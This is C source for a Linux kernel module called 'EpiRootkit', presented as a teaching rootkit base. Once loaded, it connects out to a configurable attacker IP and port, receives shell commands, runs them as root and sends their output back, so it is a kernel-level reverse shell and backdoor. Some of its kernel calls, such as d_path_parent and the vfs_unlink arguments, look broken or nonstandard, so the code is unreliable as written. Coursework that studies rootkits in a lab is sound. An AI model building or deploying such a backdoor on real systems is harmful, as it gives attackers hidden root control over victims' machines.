#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/moduleparam.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jules Aubert <jules1.aubert@epita.fr>");
MODULE_DESCRIPTION("EpiRootkit: pedagogical rootkit base");
MODULE_VERSION("0.1");

/* Module parameters */
static char *attacker_ip = "192.168.56.101";
static int   attacker_port = 5555;
module_param(attacker_ip, charp, 0444);
MODULE_PARM_DESC(attacker_ip,   "Attacker VM IPv4 address");
module_param(attacker_port, int, 0444);
MODULE_PARM_DESC(attacker_port, "Attacker VM TCP port");

#define CMD_MAX_LEN 1024
#define OUT_FILE     "/tmp/.epiroot_out"

static struct task_struct *conn_thread;
static struct socket      *conn_sock;

/* Send all bytes over socket */
static int sock_send_all(struct socket *sock, const void *buf, size_t len) {
    struct msghdr msg = {0};
    struct kvec   iov;
    iov.iov_base = (void *)buf;
    iov.iov_len  = len;
    return kernel_sendmsg(sock, &msg, &iov, 1, len) < 0 ? -1 : 0;
}

/* Receive exactly `len` bytes, or error */
static int sock_recv_all(struct socket *sock, void *buf, size_t len) {
    struct msghdr msg = {0};
    struct kvec   iov;
    int           ret, received = 0;
    while (received < len) {
        iov.iov_base = buf + received;
        iov.iov_len  = len - received;
        ret = kernel_recvmsg(sock, &msg, &iov, 1, iov.iov_len, 0);
        if (ret <= 0)
            return ret;
        received += ret;
    }
    return received;
}

/* Execute `cmd` in userspace, capture stdout/stderr+exit code */
static int execute_and_capture(const char *cmd) {
    char          *argv[] = { "/bin/sh", "-c", NULL, NULL };
    char          *envp[] = { "HOME=/", "PATH=/bin:/usr/bin", NULL };
    mm_segment_t   oldfs;
    struct file   *f;
    loff_t         pos = 0;
    char          *out_buf;
    int            ret;

    /* build: cmd > OUT_FILE 2>&1; echo EXIT=$? >> OUT_FILE */
    argv[2] = kmalloc(strlen(cmd) + 128, GFP_KERNEL);
    if (!argv[2]) return -ENOMEM;
    snprintf(argv[2], strlen(cmd) + 128,
             "%s > " OUT_FILE " 2>&1; echo EXIT=$? >> " OUT_FILE,
             cmd);

    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    /* read and send back */
    oldfs = get_fs();
    set_fs(KERNEL_DS);
    f = filp_open(OUT_FILE, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        loff_t size = i_size_read(file_inode(f));
        size_t read_len = min_t(size_t, size, CMD_MAX_LEN);
        out_buf = kmalloc(read_len, GFP_KERNEL);
        if (out_buf) {
            vfs_read(f, out_buf, read_len, &pos);
            {
                uint32_t net_len = htonl(read_len);
                sock_send_all(conn_sock, &net_len, sizeof(net_len));
                sock_send_all(conn_sock, out_buf, read_len);
            }
            kfree(out_buf);
        }
        filp_close(f, NULL);
    }
    set_fs(oldfs);
    kfree(argv[2]);
    vfs_unlink(d_path_parent(OUT_FILE), d_path_basename(OUT_FILE), NULL);
    return ret;
}

/* Thread that maintains connection and processes commands */
static int connection_worker(void *data) {
    struct sockaddr_in addr;
    int               ret;

    while (!kthread_should_stop()) {
        /* create socket */
        ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
        if (ret < 0) {
            pr_err("[EpiRootkit] sock_create failed: %d\n", ret);
            goto retry;
        }
        memset(&addr, 0, sizeof(addr));
        addr.sin_family      = AF_INET;
        addr.sin_addr.s_addr = in_aton(attacker_ip);
        addr.sin_port        = htons(attacker_port);

        ret = kernel_connect(conn_sock,
                             (struct sockaddr *)&addr,
                             sizeof(addr), 0);
        if (ret < 0) {
            pr_err("[EpiRootkit] connect failed: %d\n", ret);
            sock_release(conn_sock);
            goto retry;
        }
        pr_info("[EpiRootkit] Connected to %s:%d\n", attacker_ip, attacker_port);

        /* command loop */
        while (!kthread_should_stop()) {
            uint32_t net_len;
            int      len = sock_recv_all(conn_sock, &net_len, sizeof(net_len));
            if (len <= 0) break;
            len = ntohl(net_len);
            if (len <= 0 || len > CMD_MAX_LEN) break;
            char *cmd = kmalloc(len+1, GFP_KERNEL);
            if (!cmd) break;
            if (sock_recv_all(conn_sock, cmd, len) <= 0) {
                kfree(cmd);
                break;
            }
            cmd[len] = '\0';
            pr_info("[EpiRootkit] Exec: %s\n", cmd);
            execute_and_capture(cmd);
            kfree(cmd);
        }
        sock_release(conn_sock);
    retry:
        ssleep(5);
    }
    return 0;
}

static int __init epirootkit_init(void) {
    pr_info("[EpiRootkit] Initializing...\n");
    conn_thread = kthread_run(connection_worker, NULL, "epirootkit_conn");
    if (IS_ERR(conn_thread)) {
        pr_err("[EpiRootkit] Thread start failed\n");
        return PTR_ERR(conn_thread);
    }
    pr_info("[EpiRootkit] Module loaded.\n");
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("[EpiRootkit] Exiting...\n");
    if (conn_thread) kthread_stop(conn_thread);
    if (conn_sock)  sock_release(conn_sock);
    pr_info("[EpiRootkit] Unloaded.\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);

